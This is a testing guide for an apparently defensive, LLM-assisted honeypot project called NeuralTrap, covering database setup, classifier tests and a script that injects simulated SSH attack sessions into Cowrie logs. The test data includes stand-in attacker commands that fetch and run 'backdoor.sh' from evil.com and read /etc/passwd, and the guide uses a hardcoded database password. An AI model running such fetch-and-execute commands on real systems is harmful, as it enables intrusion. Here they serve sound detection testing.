# NeuralTrap — Feature-by-Feature Testing Guide

> **Project**: NeuralTrap — AI-Powered Honeypot Deception Network  
> **Stack**: Python, MySQL/MariaDB, Ollama (llama3.2), Cowrie honeypot, Streamlit, Plotly, GeoIP2

---

## Prerequisites

| Service | How to start | How to verify |
|---------|-------------|---------------|
| **MariaDB / MySQL** | `sudo systemctl start mariadb` | `mysql -u neuraltrap -pneuraltrap123 -e "SELECT 1"` |
| **Ollama + llama3.2** | `sudo systemctl start ollama` then `ollama pull llama3.2` | `ollama run llama3.2 "hello"` |
| **Cowrie honeypot** | `cd ~/cowrie && source cowrie-env/bin/activate && cowrie start` | `ss -tlnp \| grep 2222` |
| **Python venv** | `source ~/cowrie/cowrie-env/bin/activate` | `python3 -c "import mysql.connector; print('OK')"` |

> [!TIP]
> You can start everything at once with `bash start_neuraltrap.sh`

---

## 1. Database Schema (`db_schema.py` + `init_db.py`)

### What it does
Creates all 6 MySQL tables: `realtime_scores`, `attack_logs`, `login_attempts`, `file_transfers`, `labeled_sessions`, `session_summary`.

### How to test

```bash
python3 init_db.py
# Expected: "Database schema is ready"

mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SHOW TABLES;"
# Expected: 6 tables listed

# Idempotency — run again, no errors
python3 init_db.py
```

---

## 2. LLM Classifier (`llm_classifier.py`)

### What it does
- `classify_with_llm()` — sends commands + session intel to Ollama llama3.2. The LLM analyzes attacker behavior using its own cybersecurity expertise — **no hardcoded rules**.
- `rule_based_score()` — **LLM-powered per-command scorer**. Each command is dynamically analyzed by the LLM. Results are cached so the same command is only scored once.

### How to test

```bash
# Built-in test suite — runs 4 attack scenarios against the LLM
python3 llm_classifier.py
```

**Expected results (scores are dynamic, not fixed):**

| Test | Expected attack_type | Approximate score range |
|------|---------------------|------------------------|
| TEST 1 — Ransomware | `Ransomware Deployment` | 0.75 – 1.0 |
| TEST 2 — Recon | `Reconnaissance` | 0.05 – 0.35 |
| TEST 3 — Data Exfil | `Data Exfiltration` | 0.5 – 0.9 |
| TEST 4 — Brute Force | `Brute Force` | 0.3 – 0.9 |

> [!NOTE]
> Scores are determined dynamically by the LLM — exact values vary between runs, but relative ordering should hold (Ransomware > Data Exfil > Brute Force > Recon).

### Test per-command LLM scoring

```python
python3 -c "
from llm_classifier import rule_based_score

# The LLM analyzes each command dynamically — no static keyword lists
for cmd in ['ls', 'whoami', 'cat /etc/passwd', 'wget http://evil.com/malware.sh', 'chmod +x malware.sh']:
    score = rule_based_score(cmd)
    print(f'{cmd:45s} -> {score:.0%}')

# Scores should increase from harmless to critical
print('\nVerify: ls < whoami < cat /etc/passwd < wget < chmod +x')
"
```

### Test with session intel (Cowrie enrichment context)

```python
python3 -c "
from llm_classifier import classify_with_llm

intel = '''ADDITIONAL COWRIE SESSION INTELLIGENCE:
- SSH client version: SSH-2.0-libssh2_1.9.0
- HASSH fingerprint: abc123def456
- Authentication activity:
  . cowrie.login.failed user=root success=False
  . cowrie.login.success user=root success=True
- Dwell time (seconds): 45.30'''

result = classify_with_llm(['whoami', 'uname -a', 'cat /etc/passwd'], intel)
print(f'Type: {result[\"attack_type\"]}')
print(f'Score: {result[\"threat_score\"]:.0%}')
print(f'Reasoning: {result[\"reasoning\"]}')
"
```

---

## 3. Cowrie Context Helpers (`cowrie_context.py`)

### How to test

```python
python3 -c "
from cowrie_context import (
    new_session_state, parse_cowrie_timestamp,
    format_session_intel_for_llm, redact_password, kex_payload_for_db
)
from datetime import datetime
import json

s = new_session_state('192.168.1.100')
assert s['src_ip'] == '192.168.1.100'
assert s['blocked'] == False
print('OK new_session_state')

ts = parse_cowrie_timestamp('2025-01-15T10:30:00.123456Z')
assert isinstance(ts, datetime)
assert parse_cowrie_timestamp(None) is None
print('OK parse_cowrie_timestamp')

assert redact_password('password123') == 'p…[REDACTED] (len 11)'
assert redact_password('ab') == '[REDACTED]'
assert redact_password(None) == ''
print('OK redact_password')

kex = kex_payload_for_db({'hassh': 'abc', 'kexAlgs': ['algo1']})
assert json.loads(kex)['hassh'] == 'abc'
print('OK kex_payload_for_db')

s['client_version'] = 'SSH-2.0-OpenSSH_8.9'
s['hassh'] = 'deadbeef1234'
s['login_rows'] = [{'event_type': 'cowrie.login.failed', 'username': 'root', 'password': 'toor', 'success': False}]
intel = format_session_intel_for_llm(s)
assert 'REDACTED' in intel
print('OK format_session_intel_for_llm')

print('\nAll tests passed!')
"
```

---

## 4. Firewall / IP Blocking (`firewall.py`)

```bash
# Process high-threat sessions
python3 firewall.py

# Test threshold logic
python3 -c "
from firewall import check_and_block
check_and_block('test-001', '127.0.0.1', 'Reconnaissance', 0.40)
check_and_block('test-002', '127.0.0.1', 'Ransomware Deployment', 0.95)
"

# Verify in DB
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SELECT * FROM blocked_ips;"
```

---

## 5. Forensic Report Generator (`forensic_analyst.py`)

> [!IMPORTANT]
> Requires labeled sessions in DB. Insert test data if empty.

```bash
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
INSERT IGNORE INTO labeled_sessions (session_id, src_ip, commands, attack_type, threat_score)
VALUES ('test-forensic', '10.0.0.99', 'whoami wget http://evil.com/malware.sh chmod +x ./malware.sh', 'Ransomware Deployment', 0.95);
"

python3 forensic_analyst.py

mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
SELECT session_id, attack_type, LEFT(report, 100) AS preview FROM forensic_reports;
"
```

---

## 6. Log Ingestion (`log_to_db.py`)

```bash
python3 log_to_db.py &
echo '{"eventid":"cowrie.command.input","session":"test-logdb","src_ip":"10.10.10.10","input":"whoami","timestamp":"2025-01-15T10:00:00Z"}' >> ~/cowrie/var/log/cowrie/cowrie.json
sleep 2
mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SELECT * FROM attack_logs WHERE session_id='test-logdb';"
kill %1
```

---

## 7. Reclassification (`reclassify_with_llm.py`)

```bash
# Only if you have labeled_sessions in DB
python3 reclassify_with_llm.py
```

---

## 8. Main Engine — End-to-End (`neuraltrap.py`)

### What it does
- Parses all Cowrie event types in real-time
- Runs **LLM-powered instant scoring** on every command (dynamic, no static rules)
- Triggers full LLM session classification every 3 commands or on dangerous keywords
- Auto-blocks high-threat IPs via iptables
- Generates forensic reports in background threads

> [!WARNING]
> Do NOT run `log_to_db.py` at the same time — duplicate entries.

> [!CAUTION]
> **You MUST use a unique session ID every time you simulate.** NeuralTrap marks all existing log lines as "already processed" on startup (you'll see `Skipped N existing log lines`). Reusing the same session ID means identical lines → silently skipped. Change the ID each run: `SIM-001` → `SIM-002` → `SIM-003`, etc.

### Step 1: Start NeuralTrap

```bash
python3 neuraltrap.py
```

### Step 2: Simulate an attack (change SID each run!)

```bash
#!/bin/bash
# === CHANGE THIS EVERY RUN ===
SID="SIM-002"
# ==============================

LOG=~/cowrie/var/log/cowrie/cowrie.json
IP="203.0.113.50"

echo "Simulating session: $SID"

echo "{\"eventid\":\"cowrie.session.connect\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"timestamp\":\"2025-01-15T12:00:00Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.client.version\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"version\":\"SSH-2.0-libssh2_1.10.0\",\"timestamp\":\"2025-01-15T12:00:01Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.client.kex\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"hassh\":\"ec7378c1a92f5a8dde7e8b7a1ddf33d1\",\"hasshAlgorithms\":\"curve25519-sha256\",\"timestamp\":\"2025-01-15T12:00:02Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.login.failed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"admin123\",\"timestamp\":\"2025-01-15T12:00:03Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.login.success\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"toor\",\"timestamp\":\"2025-01-15T12:00:04Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"whoami\",\"timestamp\":\"2025-01-15T12:00:10Z\"}" >> $LOG
sleep 2

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"uname -a\",\"timestamp\":\"2025-01-15T12:00:12Z\"}" >> $LOG
sleep 2

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"cat /etc/passwd\",\"timestamp\":\"2025-01-15T12:00:14Z\"}" >> $LOG
sleep 2

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"wget http://evil.com/backdoor.sh\",\"timestamp\":\"2025-01-15T12:00:20Z\"}" >> $LOG
sleep 3

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"chmod +x backdoor.sh\",\"timestamp\":\"2025-01-15T12:00:25Z\"}" >> $LOG
sleep 2

echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"./backdoor.sh\",\"timestamp\":\"2025-01-15T12:00:28Z\"}" >> $LOG
sleep 3

echo "{\"eventid\":\"cowrie.session.file_download\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"url\":\"http://evil.com/backdoor.sh\",\"outfile\":\"/tmp/backdoor.sh\",\"shasum\":\"abc123def456\",\"timestamp\":\"2025-01-15T12:00:30Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.log.closed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"ttylog\":\"ttylogs/$SID.log\",\"size\":4096,\"shasum\":\"sha256hash\",\"duration\":30.5,\"timestamp\":\"2025-01-15T12:00:35Z\"}" >> $LOG
sleep 1

echo "{\"eventid\":\"cowrie.session.closed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"duration\":35.0,\"timestamp\":\"2025-01-15T12:00:35Z\"}" >> $LOG

echo "Done! Session $SID injected."
```

### Step 3: What to look for

| Expected log line | What it means |
|---|---|
| `🔌 New connection: 203.0.113.50 [SIM-00X]` | Session connect parsed |
| `🧩 [SIM-00X] client version: SSH-2.0-libssh2_1.10.0` | Client version captured |
| `🔐 [SIM-00X] HASSH: ec7378c1a92f5a8d…` | HASSH fingerprint captured |
| `🔑 [SIM-00X] login FAILED user='root'` | Failed login recorded |
| `✅ [SIM-00X] login OK user='root'` | Successful login recorded |
| `⌨️ [SIM-00X] whoami` | Command captured |
| `⚡ Instant score: XX%` | **LLM-scored** (dynamic, varies per command) |
| `🧠 Running LLM classification...` | Full session LLM classification triggered |
| `🎯 LLM Result: <type> \| Score: XX%` | LLM classified the session |
| `🚨 HIGH THREAT DETECTED` | Threat exceeded block threshold |
| `🚨 BLOCKED: 203.0.113.50` | IP blocked |
| `⬇️ [SIM-00X] download ...` | File download event |
| `📼 [SIM-00X] TTY log closed` | TTY metadata captured |
| `📋 Report generated for SIM-00X` | Forensic report written |

> [!NOTE]
> Instant scores are **LLM-generated** — not fixed values. The LLM dynamically analyzes each command. Expect `whoami` to score low and `wget malware` to score high, but exact percentages will vary.

### Step 4: Verify database

```bash
SID="SIM-002"  # match the session ID you used
mysql -u neuraltrap -pneuraltrap123 neuraltrap <<SQL
SELECT '--- attack_logs ---' AS t;
SELECT session_id, event_type, src_ip, LEFT(command,60) AS cmd FROM attack_logs WHERE session_id='$SID';
SELECT '--- login_attempts ---' AS t;
SELECT session_id, event_type, username, success FROM login_attempts WHERE session_id='$SID';
SELECT '--- file_transfers ---' AS t;
SELECT session_id, direction, url, shasum FROM file_transfers WHERE session_id='$SID';
SELECT '--- session_summary ---' AS t;
SELECT session_id, dwell_seconds, client_version, hassh FROM session_summary WHERE session_id='$SID';
SELECT '--- labeled_sessions ---' AS t;
SELECT session_id, attack_type, threat_score, dwell_seconds FROM labeled_sessions WHERE session_id='$SID';
SELECT '--- realtime_scores ---' AS t;
SELECT session_id, command, attack_type, threat_score FROM realtime_scores WHERE session_id='$SID';
SELECT '--- forensic_reports ---' AS t;
SELECT session_id, attack_type, LEFT(report,100) AS preview FROM forensic_reports WHERE session_id='$SID';
SELECT '--- blocked_ips ---' AS t;
SELECT ip_address, attack_type, threat_score FROM blocked_ips WHERE ip_address='203.0.113.50';
SQL
```

---

## 9. Streamlit Dashboard (`dashboard.py`)

```bash
streamlit run dashboard.py --server.port 8501
# Open http://localhost:8501
```

### Test each page

| Page | What to check |
|------|--------------|
| **🏠 Overview** | 4 metric cards, pie chart (attack types), bar chart (avg scores), recent sessions table |
| **⚔️ Live Attacks** | Last 50 commands, dangerous ones (wget/curl/chmod) in red, safe ones in green |
| **🔬 Cowrie Intel** | Login events table, file transfers table, session summaries with dwell/HASSH/TTY |
| **🧠 AI Predictions** | Sessions sorted by threat score, color-coded indicators (🔴🟡🟢), progress bars |
| **📋 Forensic Reports** | Expandable LLM-generated reports, ✅/❌ feedback buttons that persist |
| **🚫 Blocked IPs** | Blocked IPs table with reason, bar chart by attack type |
| **👤 Attacker Profiles** | Grouped by IP, session count, avg/max threat, 🔴BLOCKED / 🟡MONITORING |
| **🌍 Attack World Map** | GeoIP scatter map (needs GeoLite2 DB + real external IPs) |
| **📈 Live Threat Monitor** | Top 5 sessions, threat histogram with 85% threshold line, timeline chart |

> [!NOTE]
> The world map requires `~/cowrie/geoip/GeoLite2-City.mmdb` and non-localhost IPs.

---

## 10. Quick Smoke Test Checklist

```
[ ] python3 init_db.py                     → "schema is ready"
[ ] mysql ... -e "SHOW TABLES"             → 6+ tables
[ ] python3 llm_classifier.py              → 4 tests, valid JSON results
[ ] python3 firewall.py                    → runs without crash
[ ] python3 forensic_analyst.py            → generates reports (or "no sessions")
[ ] python3 neuraltrap.py                  → banner + watching message
[ ] Simulate attack (unique SID!)          → events appear in output
[ ] streamlit run dashboard.py             → loads at http://localhost:8501
[ ] Dashboard pages render with data       → charts, tables, metrics visible
```

---

## 11. Common Issues

| Issue | Fix |
|-------|-----|
| `Access denied for user 'neuraltrap'` | `CREATE USER 'neuraltrap'@'localhost' IDENTIFIED BY 'neuraltrap123'; GRANT ALL ON neuraltrap.* TO 'neuraltrap'@'localhost';` |
| `Table 'blocked_ips' doesn't exist` | Run `python3 firewall.py` and `python3 forensic_analyst.py` once |
| `ollama` connection refused | `sudo systemctl start ollama` |
| `model 'llama3.2' not found` | `ollama pull llama3.2` |
| No data on dashboard | Run simulated attack from Section 8 |
| World Map "GeoIP error" | Download GeoLite2-City.mmdb to `~/cowrie/geoip/` |
| Simulation shows nothing | **You reused a session ID!** Change `SID` to a new value |
| `watchdog` import error | `pip install watchdog` |
| `outfile` SQL syntax error | Ensure backticks around `` `outfile` `` in db_schema.py |

---

## Quick Reference

```bash
python3 init_db.py              # Database setup
python3 llm_classifier.py       # LLM classifier tests
python3 firewall.py              # Firewall module
python3 forensic_analyst.py      # Forensic reports
python3 reclassify_with_llm.py   # Batch reclassify
python3 neuraltrap.py            # Main engine
streamlit run dashboard.py --server.port 8501  # Dashboard
```
